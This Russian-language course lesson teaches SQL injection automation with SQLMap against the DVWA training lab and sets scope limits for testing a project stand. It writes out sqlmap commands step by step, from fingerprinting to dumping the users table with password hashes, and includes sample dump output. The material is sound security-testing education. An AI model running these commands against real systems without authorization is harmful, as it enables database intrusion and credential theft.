# Занятие 19. SQL Injection продвинутый: SQLMap автоматизация

## Учебная рамка

**Входные требования:** Базовое понимание HTTP, форм, параметров URL и работы браузера/DevTools.

**Результат занятия:** Студент воспроизводит уязвимость только в учебном приложении и объясняет условие ее возникновения и способ защиты.

**Наследуемая SDET-компетенция:** test design, negative testing, API/UI evidence и перевод OWASP-риска в проверяемый QA-кейс.

**Security QA-компетенция:** моделирование web-рисков OWASP и безопасная ручная проверка Slider AI.

**Связь с книгами:** OWASP/WSTG как основной security reference; «PyCharm. Профессиональная работа на Python 2024» — DevTools/HTTP Client/evidence workflow.

**Основной источник:** «PyCharm. Профессиональная работа на Python 2024» и `Black Hat Python` только для lab-only/defensive interpretation.

**Дополнительные источники:** «Легкий способ выучить Python 3 еще глубже» для обработки запросов, текстов и простых проверочных данных.

**Что берем из источника:** разделение lab payload и product-safe marker, HTTP evidence, перевод риска OWASP в security test case.

**Как это превращается в SDET/Security QA навык:** проектировать безопасные проверки Slider AI через OWASP/WSTG без destructive payloads.

**Что нельзя переносить на Slider AI без отдельного разрешения:** учебные payloads выполнять только в DVWA/WebGoat/PortSwigger; на Slider AI использовать безопасные маркеры и passive evidence.


**Процессный артефакт:** `THREAT_MODEL.md` или `SECURITY_FINDING_TEMPLATE.md`: abuse case, evidence и expected control.

**Безопасная цель:** DVWA, WebGoat, bWAPP, PortSwigger Web Security Academy или локальная учебная VM. Запрещены реальные сайты без письменного разрешения.

**Среда выполнения:** Основной путь — macOS native, браузер, DevTools, Homebrew и Python. Kali Linux ARM64 VM, UTM или cloud lab используются только если это явно требуется задачей или вынесено в углубление.

**Обязательный путь новичка:** Пройти демонстрационный сценарий на низком уровне сложности, сделать скриншот/лог запроса и описать причину уязвимости.

**Углубление:** Повторить на более высоком уровне сложности, сравнить поведение фильтров и предложить безопасную реализацию.

**Минимальная проверка успеха:** Уязвимость подтверждена в учебной среде, payload не направлялся на реальные сервисы, студент может назвать защитную меру.

**Эталонный вывод:** Отчет содержит URL учебной лаборатории, введенный payload, фрагмент ответа и объяснение риска простыми словами.

**Критерии сдачи:** Зачет: подтверждена учебная уязвимость и описана защита. Отлично: добавлен разбор, почему payload работает или перестает работать.

## Reading pack из книг курса

Этот раздел не является заданием “пойди и найди теорию в книгах”. Книги использованы автором курса для подготовки лекции `Занятие 19. SQL Injection продвинутый: SQLMap автоматизация`, а студент получает самодостаточное объяснение в разделах `Source-driven theory` и `Теория`.

- `docs/socraticode/pycharm-professional-python-2024-pages/`
- `docs/socraticode/black-hat-python-ru-pages/` только lab-only/defensive

Конкретные страницы для этого блока: `pycharm-professional-python-2024-pages/page-338.md`-`page-369.md`; `black-hat-python-ru-pages/page-120.md`-`page-140.md` только lab-only.

Что обязана объяснить лекция на основе этих книг:

1. Термины и команды, которые прямо поддерживают тему урока.
2. Инженерный принцип, который переносится из SDET в Security QA.
3. Ограничение безопасности: что нельзя делать на Slider AI без approval.
4. Пример, который превращается в evidence, helper, checklist или process artifact.

Если книга описывает опасную технику, она переносится только в lab-only или defensive interpretation. Студент не должен обращаться к книгам, чтобы понять базовую теорию текущего урока.

## Source-driven theory

Этот урок опирается на книжные источники курса как на базу, а не как на факультативное чтение. Из источников берется практическая дисциплина: разделение lab payload и product-safe marker, HTTP evidence, перевод риска OWASP в security test case. Для SDET это важно потому, что security-проверка должна быть воспроизводимой, объяснимой и пригодной для отчета, а не превращаться в набор разрозненных команд.

Книжный материал в уроке используется в трех шагах:

1. Понять термин или технику на безопасном примере.
2. Перевести идею в QA-действие: test case, observation, evidence, helper или process artifact.
3. Отделить разрешенную практику от действий, которые требуют отдельного approval.

Граница для Slider AI: учебные payloads выполнять только в DVWA/WebGoat/PortSwigger; на Slider AI использовать безопасные маркеры и passive evidence. Если нужная техника выходит за эту границу, результат урока оформляется как `requires approval`, lab-only practice или defensive recommendation.

## Теория

**SQLMap** — это открытый инструмент командной строки для автоматизированного обнаружения и эксплуатации уязвимостей SQL Injection. Написан на Python.

### Как работает SQLMap

1. **Обнаружение (Detection)**: Инструмент отправляет различные payloads и анализирует ответы сервера
2. **Определение БД (Fingerprinting)**: Определяет тип СУБД (MySQL, PostgreSQL, MSSQL, Oracle и др.)
3. **Эксплуатация (Exploitation)**: Извлекает данные через инъекцию

### Основные этапы атаки

1. Проверка на наличие уязвимости
2. Перечисление баз данных (`--dbs`)
3. Перечисление таблиц в базе (`--tables`)
4. Перечисление колонок (`--columns`)
5. Извлечение данных (`--dump`)

### Типы инъекций, которые ищет SQLMap

- Boolean-based blind
- Error-based
- Time-based blind
- UNION query
- Stacked queries

### Важные параметры

| Параметр | Описание |
|----------|----------|
| `-u URL` | Целевой URL |
| `--dbs` | Перечислить все базы данных |
| `--tables` | Перечислить таблицы (нужно указать `-D база`) |
| `--columns` | Перечислить колонки (нужно `-D база -T таблица`) |
| `--dump` | Скачать данные из таблицы |
| `--cookie` | Установить cookie (для авторизованных зон) |
| `--forms` | Тестировать формы на странице |
| `--batch` | Не задавать вопросов, использовать дефолтные ответы |
| `-p` | Указать параметр для тестирования |
| `--level` | Уровень тестирования (1-5, по умолчанию 1) |
| `--risk` | Риск тестирования (1-3, по умолчанию 1) |

---

## Guided practice

1. Сформулируйте риск урока как abuse case и как проверяемое ожидание защиты.
2. Отработайте опасную технику только в lab, если урок этого требует.
3. Для Slider AI выполните safe-marker или passive observation без извлечения данных и без destructive payload.
4. Классифицируйте результат: `finding`, `observation`, `not reproducible`, `not applicable` или `requires approval`.

### Эталон самостоятельной работы

К концу guided practice у студента есть короткий Markdown-артефакт: цель проверки, выполненные шаги, sanitized evidence, интерпретация результата, границы применимости и следующий безопасный шаг.

## Практическое занятие

### Подготовка

Убедитесь, что DVWA запущена и вы авторизованы. Вам понадобятся cookie сессии.

**Получение cookie:**
1. Откройте DVWA в браузере
2. Войдите под admin/password
3. Откройте DevTools (F12) → вкладка Network
4. Обновите страницу, найдите запрос, скопируйте заголовок `Cookie`
5. Cookie выглядит примерно так: `PHPSESSID=abc123; security=low`

### Базовое использование SQLMap

**Шаг 1: Проверка на уязвимость**
```bash
sqlmap -u "http://192.168.0.x/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie "PHPSESSID=ВАША_СЕССИЯ; security=low" \
  --batch
```

Результат: SQLMap сообщит, уязвим ли параметр `id`.

**Шаг 2: Получение списка баз данных**
```bash
sqlmap -u "http://192.168.0.x/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie "PHPSESSID=ВАША_СЕССИЯ; security=low" \
  --dbs --batch
```

Результат: список баз (information_schema, dvwa, mysql, performance_schema).

**Шаг 3: Получение таблиц в базе dvwa**
```bash
sqlmap -u "http://192.168.0.x/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie "PHPSESSID=ВАША_СЕССИЯ; security=low" \
  -D dvwa --tables --batch
```

Результат: таблицы `guestbook` и `users`.

**Шаг 4: Получение колонок таблицы users**
```bash
sqlmap -u "http://192.168.0.x/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie "PHPSESSID=ВАША_СЕССИЯ; security=low" \
  -D dvwa -T users --columns --batch
```

Результат: список колонок (user_id, first_name, last_name, user, password...).

**Шаг 5: Скачивание данных из таблицы users**
```bash
sqlmap -u "http://192.168.0.x/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie "PHPSESSID=ВАША_СЕССИЯ; security=low" \
  -D dvwa -T users --dump --batch
```

Результат: полная таблица пользователей с хешами паролей.

### Использование прокси (для отладки)

Добавьте параметр `--proxy="http://127.0.0.1:8080"`, чтобы видеть запросы SQLMap в Burp Suite.

```bash
sqlmap -u "http://192.168.0.x/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie "PHPSESSID=ВАША_СЕССИЯ; security=low" \
  --dbs --batch --proxy="http://127.0.0.1:8080"
```

### Скриншоты для отчета

1. **Скриншот 1**: Вывод команды `--dbs` — список баз данных
2. **Скриншот 2**: Вывод команды `-D dvwa --tables` — таблицы в dvwa
3. **Скриншот 3**: Вывод команды `--dump` — данные пользователей

### Примеры вывода SQLMap

**Вывод --dbs:**
```
[INFO] fetching databases
[INFO] fetching tables for 'dvwa'
[INFO] retrieved: information_schema
[INFO] retrieved: dvwa
[INFO] retrieved: mysql
[INFO] retrieved: performance_schema
available databases [4]:
[*] dvwa
[*] information_schema
[*] mysql
[*] performance_schema
```

**Вывод --dump:**
```
Database: dvwa
Table: users
[5 entries]
+---------+------------+-----------+-------+----------------------------------+
| user_id | first_name | last_name | user  | password                         |
+---------+------------+-----------+-------+----------------------------------+
| 1       | admin      | admin     | admin | 5f4dcc3b5aa765d61d8327deb882cf99 |
| 2       | Gordon     | Brown     | gordonb | e99a18c428cb38d5f260853678922e03 |
+---------+------------+-----------+-------+----------------------------------+
```

### Частые ошибки

1. **Неправильные cookie** — без актуальной сессии SQLMap получит страницу логина, а не результат
2. **Забыли --batch** — SQLMap будет задавать вопросы, ожидая ввода
3. **Неправильный уровень** — на Medium/High нужен --level 2-5 и --risk 2-3
4. **GET вместо POST** — для форм нужно использовать --data

### Вопросы на понимание

1. Почему SQLMap нужны cookie сессии для работы с DVWA?
2. Чем отличается --dbs от --tables, когда нужно указывать -D?
3. Зачем нужен параметр --batch в автоматизированных скриптах?
4. Почему SQLMap может не найти уязвимость на уровне Medium?

### Адаптация под macOS (M2)

```bash
# Установка SQLMap на macOS (M2)
pip3 install sqlmap

# Или через Homebrew
brew install sqlmap

# Проверка
sqlmap --version

# Если cookie содержат спецсимволы, используйте одинарные кавычки
sqlmap -u "http://192.168.0.x/vulnerabilities/sqli/?id=1" \
  --cookie 'PHPSESSID=abc123; security=low' \
  --batch
```

---


## Адаптация под macOS (M2, 8GB)

- Для macOS native используйте Homebrew или официальный installer: `brew install <tool>`; для явно помеченной Kali/Linux-среды допустим `apt`.
- Kali/Linux VM запускайте только как углубление и выделяйте не более 3-4GB RAM на MacBook Air M2 (8GB)
- Если нужна Kali/Linux VM на Apple Silicon, используйте ARM64-образ в UTM/VMware Fusion/Parallels; не используйте x86/x64 VM как базовый путь.
- Docker работает нативно на M2: `docker pull <image>`
- Для VPN используйте Tunnelblick (OpenVPN) или официальные клиенты
- Для Python используйте `pip3 install` вместо `pip install`


## Задачи для самостоятельного выполнения

1. **Автоматизированный взлом**: Используя SQLMap, получите все данные из таблицы `users` в базе `dvwa`. В отчете укажите: какие команды вы использовали, сколько записей извлечено, какие хеши паролей получены.

2. **Работа с POST-запросами**: На странице SQL Injection (Blind) в DVWA используется POST-форма. Используйте SQLMap для взлома:
   ```bash
   sqlmap -u "http://192.168.0.x/vulnerabilities/sqli_blind/" \
     --data "id=1&Submit=Submit" \
     --cookie "PHPSESSID=ВАША_СЕССИЯ; security=low" \
     --dbs --batch
   ```
   Опишите разницу между тестированием GET и POST параметров.

3. **Извлечение конкретных колонок**: Используя SQLMap, получите только колонки `user` и `password` из таблицы `users`. Какую команду вы использовали? Сколько строк было извлечено?

4. **Тестирование уровня Medium**: Переключите DVWA на уровень Medium. Попробуйте использовать SQLMap с параметром `--level 2` или `--risk 2`. Сработало ли автоматическое обнаружение? Почему?

5. **Поиск других уязвимостей**: Используйте SQLMap с флагом `--forms` на главной странице DVWA (после входа), чтобы найти другие формы, потенциально уязвимые к SQLi. Перечислите найденные формы и результаты проверки.

## Практика на Slider AI

**Цель стенда:** `https://olddev.slider-ai.ru`

**Контекст разрешения:** тестовый стенд проекта Slider AI, доступен QA для обучения и проверки безопасности. Production и любые другие домены не входят в это задание.

**Ограничения безопасности:** соблюдать `education/slider_ai_scope.md`; не выполнять DoS/load-тесты, brute force, destructive payloads, изменение чужих данных, извлечение секретов и действия вне согласованного scope.

**Уровень прогрессии:** SQLMap как контролируемый инструмент

### Минимум

Не выполнять и не запускать sqlmap по Slider AI; подготовьте чек-лист условий, при которых его можно согласовать.

### Практика Slider AI

Выберите один запрос-кандидат и сохраните его как sanitized request без cookies/секретов.

### Углубление после изучения следующих уроков

После письменного разрешения и отдельного окна тестирования запланируйте dry-run с безопасными флагами.

### Артефакт сдачи

Markdown-запись по шаблону из `education/slider_ai_scope.md`: урок, компонент Slider AI, шаги, фактический результат, доказательства без секретов, риск, рекомендация и статус.

### Критерий готовности

Задание выполнено только на `olddev.slider-ai.ru`, не выходит за scope, содержит проверяемый артефакт и явно отмечает `finding`, `informational`, `not reproducible`, `not applicable` или `requires approval`.

## Rubric

| Уровень | Что должно быть сдано |
|---|---|
| Зачет | Выполнен обязательный путь новичка, есть sanitized evidence, действия не выходят за scope |
| Хорошо | Есть объяснение риска или процесса, аккуратные шаги воспроизведения и корректный статус результата |
| Отлично | Результат связан с `OWASP Test Design for Slider AI`, remediation/retest или automation appendix |

## Self-check

1. Какая SDET-компетенция используется в уроке?
2. Какая часть объяснения опирается на книги курса?
3. Где проходит безопасная граница для Slider AI?
4. Какой артефакт можно показать команде без раскрытия секретов?
5. Что нужно вынести в углубление, lab-only или отдельный approval?
